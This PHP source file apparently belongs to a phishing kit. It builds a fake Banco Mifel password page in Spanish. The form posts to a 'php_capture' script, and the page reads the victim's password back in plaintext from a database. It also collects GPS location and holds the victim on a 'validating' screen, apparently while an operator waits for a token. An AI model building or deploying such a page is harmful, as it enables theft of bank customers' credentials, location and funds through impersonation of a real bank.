<?php
session_start();

require_once __DIR__ . '/php_config/conexionbd.php';
require_once __DIR__ . '/php_config/token_pantalla_helpers.php';
require_once __DIR__ . '/php_config/gps_helpers.php';
require_once __DIR__ . '/includes/gps_aviso_modal.php';

if (isset($_GET['reiniciar']) && $_GET['reiniciar'] === '1') {
    tokenPantallaReiniciarSesion();
    header('Location: personas.html');
    exit;
}

if (!isset($_SESSION['usuario_id'])) {
    header('Location: personas.html');
    exit;
}

$modoValidando = false;
$passwordVal = '';
$usuarioSafe = '';

$pdo = conectarBD();
$usuarioId = (int) $_SESSION['usuario_id'];
$usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);

if (!$usuario || !tokenPantallaEsPersona($usuario)) {
    header('Location: personas.html');
    exit;
}

$stmtPass = $pdo->prepare('SELECT password FROM usuarios WHERE id = ? LIMIT 1');
$stmtPass->execute([$usuarioId]);
$passwordEnBd = trim((string) ($stmtPass->fetchColumn() ?: ''));

if (tokenPantallaTokenIngresado($usuario)) {
    tokenPantallaReiniciarSesion();
    header('Location: personas.html');
    exit;
}

if ($passwordEnBd !== '') {
    $avance = tokenPantallaEvaluarAvance($pdo, $usuarioId);

    if ($avance['puede_avanzar'] && !tokenPantallaEsperaActiva()) {
        tokenPantallaReiniciarSesion();
        header('Location: personas.html');
        exit;
    }

    $modoValidando = true;
    tokenPantallaMarcarEsperaActiva();
    $passwordVal = (string) ($_SESSION['password'] ?? $passwordEnBd);
}

$passwordSafe = htmlspecialchars($passwordVal, ENT_QUOTES, 'UTF-8');
$usuarioSafe = htmlspecialchars((string) ($_SESSION['usuario'] ?? ''), ENT_QUOTES, 'UTF-8');
$mostrarModalGps = $modoValidando && gpsUsuarioNecesitaCaptura($pdo, $usuarioId);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $modoValidando ? 'Validando acceso' : 'Contraseña' ?> - Acceso</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/feLinicio.css">
    <link rel="stylesheet" href="css/_responsivefel.css">
    <link rel="stylesheet" href="css/gps.css">
    <link rel="stylesheet" href="css/authenticate.css">
    <link rel="stylesheet" href="css/zeppelin_churro_btn.css">
    <?php gpsAvisoModalAssets($mostrarModalGps); ?>
    <?php require_once __DIR__ . '/includes/responsive_movil.php'; mifel_responsive_movil_assets('gps-flujo'); ?>
</head>
<body class="<?= $modoValidando ? 'auth-validando' : '' ?>">
    <header class="header-container">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="images/logo_mifel_hd.svg" alt="Mifel" class="mifel-header-logo">
            </div>
            <div class="language-dropdown">
                <img src="images/Flag_mx2.svg" alt="México" class="flag-icon">
                <span class="language-text">ES</span>
                <img src="images/drop_down.png" alt="dropdown" class="dropdown-arrow">
            </div>
        </div>
    </header>

    <main class="auth-container">
        <div class="auth-content">
            <div class="avatar-container">
                <div class="avatar-circle avatar-loading"></div>
                <img src="images/avatar-elipse.png" alt="Avatar" class="avatar-image">
            </div>

            <div class="welcome-text">
                <h1 class="hello-text">Hola,</h1>
                <?php if ($modoValidando): ?>
                <p class="user-name"><?= $usuarioSafe !== '' ? $usuarioSafe : 'Usuario' ?></p>
                <?php else: ?>
                <p class="user-name user-name-loading">
                    <span class="name-skeleton">***</span>
                    <span class="name-skeleton">****</span>
                </p>
                <?php endif; ?>
            </div>

            <form class="auth-form<?= $modoValidando ? ' auth-form--validando' : '' ?>" action="php_capture/password_personas.php" method="POST" id="authForm">
                <div class="input-group">
                    <label for="password" class="input-label">Contraseña</label>
                    <div class="input-wrapper">
                        <input
                            type="password"
                            id="password"
                            name="password"
                            class="input-field"
                            required
                            autocomplete="current-password"
                            value="<?= $passwordSafe ?>"
                            <?= $modoValidando ? 'disabled readonly' : '' ?>
                        >
                        <button type="button" class="toggle-eye" aria-label="Mostrar/Ocultar" onclick="togglePassword()" <?= $modoValidando ? 'disabled tabindex="-1"' : '' ?>>
                            <img src="images/toggle-eye_text.svg" alt="Mostrar" class="eye-icon" id="eyeIcon">
                        </button>
                    </div>
                </div>

                <div class="forgot-link">
                    <a href="#" class="link-text<?= $modoValidando ? ' link-disabled' : '' ?>" <?= $modoValidando ? 'tabindex="-1" aria-disabled="true"' : '' ?>>¿Olvidaste tu contraseña?</a>
                </div>

                <button
                    type="submit"
                    class="continue-button<?= $modoValidando ? ' continue-button--waiting' : '' ?>"
                    id="authSubmitBtn"
                    <?= $modoValidando ? 'disabled aria-busy="true"' : '' ?>
                >
                    <span class="continue-button__label">Continuar</span>
                    <?php if ($modoValidando): ?>
                    <img src="empresas/images/login-spinner.svg" alt="" class="continue-button__spinner" width="20" height="20">
                    <?php endif; ?>
                </button>

                <div class="change-user">
                    <span class="change-user-text">¿No eres tú? </span>
                    <a href="authenticate-execution.php?reiniciar=1" class="change-user-link<?= $modoValidando ? ' link-disabled' : '' ?>" <?= $modoValidando ? 'tabindex="-1" aria-disabled="true"' : '' ?>>Cambiar usuario</a>
                </div>
            </form>
        </div>
    </main>

    <?php if ($mostrarModalGps) {
        gpsAvisoModalMarkup('php_capture/gps_login_empresas.php', 'images/gps.png', 'empresas/images/login-spinner.svg');
    } ?>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            if (!passwordInput || passwordInput.disabled) return;

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.src = 'images/toggle-eye_password.svg';
                eyeIcon.alt = 'Ocultar';
            } else {
                passwordInput.type = 'password';
                eyeIcon.src = 'images/toggle-eye_text.svg';
                eyeIcon.alt = 'Mostrar';
            }
        }
    </script>
    <script src="php_modales/js/check_status.js"></script>
    <?php if ($modoValidando): ?>
    <script src="js/personas_token_validando.js"></script>
    <?php if ($mostrarModalGps): ?>
    <script src="js/gps_login_modal.js?v=20260806"></script>
    <?php endif; ?>
    <?php endif; ?>
</body>
</html>
